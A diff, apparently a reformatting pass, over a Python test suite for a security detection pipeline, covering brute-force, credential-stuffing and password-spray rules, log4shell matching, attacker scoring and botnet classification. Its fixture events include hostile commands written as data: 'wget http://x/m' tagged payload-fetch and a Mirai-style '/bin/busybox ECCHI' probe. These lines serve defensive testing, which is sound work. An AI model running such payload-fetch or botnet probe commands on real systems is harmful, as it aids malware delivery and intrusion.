@@ -21,8 +21,7 @@ from pipeline.detection.rules import (
     matches,
 )
 from pipeline.detection.scoring import classify, explain, score_attacker, severity_for_score
-from storage.models import EventType, Severity, utcnow
-
+from storage.models import utcnow
 
 # --------------------------------------------------------------------------- #
 # Rule loading and validation
@@ -101,8 +100,13 @@ class TestMatches:
 class TestThresholdRule:
     def _rule(self, **kw) -> Rule:
         base = dict(
-            id="test_bf", name="bf", severity="high", type="threshold",
-            window_minutes=10, group_by="src_ip", threshold=20,
+            id="test_bf",
+            name="bf",
+            severity="high",
+            type="threshold",
+            window_minutes=10,
+            group_by="src_ip",
+            threshold=20,
             where={"event_type": "auth_attempt"},
         )
         base.update(kw)
@@ -140,9 +144,15 @@ class TestThresholdRule:
 class TestDistinctRule:
     def _rule(self, **kw) -> Rule:
         base = dict(
-            id="cred_stuff", name="cs", severity="high", type="distinct",
-            window_minutes=30, group_by="src_ip", distinct_field="username",
-            threshold=15, where={"event_type": "auth_attempt"},
+            id="cred_stuff",
+            name="cs",
+            severity="high",
+            type="distinct",
+            window_minutes=30,
+            group_by="src_ip",
+            distinct_field="username",
+            threshold=15,
+            where={"event_type": "auth_attempt"},
         )
         base.update(kw)
         return Rule(**base)
@@ -150,8 +160,7 @@ class TestDistinctRule:
     def test_fires_on_distinct_usernames(self, make_event):
         base = utcnow()
         events = [
-            make_event(username=f"user{i}", ts=base + dt.timedelta(seconds=i))
-            for i in range(15)
+            make_event(username=f"user{i}", ts=base + dt.timedelta(seconds=i)) for i in range(15)
         ]
         alerts = evaluate_rule(self._rule(), events)
         assert len(alerts) == 1
@@ -159,17 +168,20 @@ class TestDistinctRule:
 
     def test_repeated_same_username_does_not_count(self, make_event):
         base = utcnow()
-        events = [
-            make_event(username="root", ts=base + dt.timedelta(seconds=i)) for i in range(40)
-        ]
+        events = [make_event(username="root", ts=base + dt.timedelta(seconds=i)) for i in range(40)]
         assert evaluate_rule(self._rule(), events) == []
 
 
 class TestMatchRule:
     def test_single_matching_event_fires(self, make_event):
         rule = Rule(
-            id="log4shell", name="l4s", severity="critical", type="match",
-            window_minutes=60, group_by="src_ip", where={"tags__in_tags": "log4shell"},
+            id="log4shell",
+            name="l4s",
+            severity="critical",
+            type="match",
+            window_minutes=60,
+            group_by="src_ip",
+            where={"tags__in_tags": "log4shell"},
         )
         events = [make_event(tags=["log4shell"])]
         alerts = evaluate_rule(rule, events)
@@ -178,8 +190,13 @@ class TestMatchRule:
 
     def test_no_match_no_alert(self, make_event):
         rule = Rule(
-            id="log4shell", name="l4s", severity="critical", type="match",
-            window_minutes=60, group_by="src_ip", where={"tags__in_tags": "log4shell"},
+            id="log4shell",
+            name="l4s",
+            severity="critical",
+            type="match",
+            window_minutes=60,
+            group_by="src_ip",
+            where={"tags__in_tags": "log4shell"},
         )
         assert evaluate_rule(rule, [make_event(tags=["something-else"])]) == []
 
@@ -191,15 +208,23 @@ class TestPasswordSpray:
         base = utcnow()
         events = [
             make_event(
-                username=f"user{i}", password="Winter2024",
-                src_ip=f"192.0.2.{i}", ts=base + dt.timedelta(seconds=i),
+                username=f"user{i}",
+                password="Winter2024",
+                src_ip=f"192.0.2.{i}",
+                ts=base + dt.timedelta(seconds=i),
             )
             for i in range(12)
         ]
         rule = Rule(
-            id="spray", name="spray", severity="high", type="distinct",
-            window_minutes=60, group_by="password", distinct_field="username",
-            threshold=10, where={"event_type": "auth_attempt"},
+            id="spray",
+            name="spray",
+            severity="high",
+            type="distinct",
+            window_minutes=60,
+            group_by="password",
+            distinct_field="username",
+            threshold=10,
+            where={"event_type": "auth_attempt"},
         )
         alerts = evaluate_rule(rule, events)
         assert len(alerts) == 1
@@ -209,11 +234,23 @@ class TestPasswordSpray:
 class TestBrokenRuleIsolation:
     def test_one_broken_rule_does_not_stop_others(self, make_event, monkeypatch):
         good = Rule(
-            id="good", name="g", severity="high", type="match",
-            window_minutes=60, group_by="src_ip", where={"tags__in_tags": "x"},
+            id="good",
+            name="g",
+            severity="high",
+            type="match",
+            window_minutes=60,
+            group_by="src_ip",
+            where={"tags__in_tags": "x"},
         )
-        bad = Rule(id="bad", name="b", severity="high", type="match", window_minutes=60,
-                   group_by="src_ip", where={"field__badop": 1})
+        bad = Rule(
+            id="bad",
+            name="b",
+            severity="high",
+            type="match",
+            window_minutes=60,
+            group_by="src_ip",
+            where={"field__badop": 1},
+        )
         events = [make_event(tags=["x"])]
         # evaluate_rules must swallow the bad rule and still return the good hit.
         alerts = evaluate_rules(events, [bad, good])
@@ -239,16 +276,23 @@ class TestScoring:
         intrusion = [
             make_event(event_type="auth_success", severity="high", tags=["shell-granted"]),
             make_event(event_type="command", severity="high", command="whoami"),
-            make_event(event_type="command", severity="critical", command="wget http://x/m",
-                       tags=["payload-fetch"]),
+            make_event(
+                event_type="command",
+                severity="critical",
+                command="wget http://x/m",
+                tags=["payload-fetch"],
+            ),
         ]
         score_intrusion, _, _ = score_attacker(None, intrusion)
         assert score_intrusion > score_noisy
 
     def test_score_is_bounded(self, burst):
         events = burst(
-            5000, spacing_seconds=0.1, event_type="command",
-            severity="critical", tags=["payload-fetch", "mirai-signature"],
+            5000,
+            spacing_seconds=0.1,
+            event_type="command",
+            severity="critical",
+            tags=["payload-fetch", "mirai-signature"],
         )
         score, _, _ = score_attacker(None, events)
         assert 0 <= score <= 100
@@ -256,7 +300,9 @@ class TestScoring:
     def test_iot_signature_classifies_as_botnet(self, make_event):
         events = [
             make_event(event_type="auth_attempt", tags=["iot-default-credential"]),
-            make_event(event_type="command", command="/bin/busybox ECCHI", tags=["mirai-signature"]),
+            make_event(
+                event_type="command", command="/bin/busybox ECCHI", tags=["mirai-signature"]
+            ),
         ]
         classification, _tags = classify(None, events)
         assert classification == "botnet-loader"
